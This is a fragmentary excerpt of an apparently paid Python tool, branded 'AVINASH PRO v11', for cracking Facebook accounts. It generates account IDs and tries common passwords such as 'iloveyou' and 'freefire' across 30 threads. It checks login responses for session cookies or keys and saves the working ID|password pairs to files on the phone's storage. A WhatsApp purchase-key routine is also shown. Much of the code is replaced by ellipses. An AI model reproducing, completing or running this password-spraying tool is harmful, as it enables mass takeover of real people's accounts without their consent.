...
----------------------------------------------
 Author    : AVINASH
 Github    : AVINASH-KOT
 Facebook  : A V I N A S H
 Tool Name : v11 IS OUT
 Type type : PAID
 Version   : 2.0
----------------------------------------------
 AVINASH PRO VERSION v11
 FEEL THE POWER OF AVINASH (⁠⌐⁠■⁠-⁠■⁠)
\033[1;37m----------------------------------------------""")
def linex():
        print('\033[1;37m----------------------------------------------')
def clear():
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system('xdg-open https://www.facebook.com/avinash.don.9028?mibextid=ZbWKwL');menu()
                        elif xd in ['0','00']:
                                exit(' Thanks for use 🥰 ')
                        else:
                        ...
                        linex()
                        url_wa = "https://api.whatsapp.com/send?phone=+9779702646134&text="
                        name = input(" Enter your Name : ")
                        linex()
                        tks = ("Hi AVINASH Sir, I Need To Buy Your Paid AVINASHv11 PRO Tools Version 2.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                        print(' Run :  python Avinash.py')
                        exit()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
...
def bd():
                ...
                with tred(max_workers=30) as Aking:     
                        ...
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'Nepal','Nepal','i love you','iloveyou','free fire','freefire']
                                Aking.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [AVINASH-KOT] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Aking:
                                ...
                                print('\r\r\033[1;32m [AVINASH-OK] %s | %s'%(ids,pas))
                                open('/sdcard/AVINASH-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Aking:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [AVINASH-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/AVINASH-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [AVINASH-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/AVINASH-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/AVINASH-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [AVINASH-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/AVINASH-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [AVINASH-OK] '+uid+' | '+pas+'\033[1;97m')
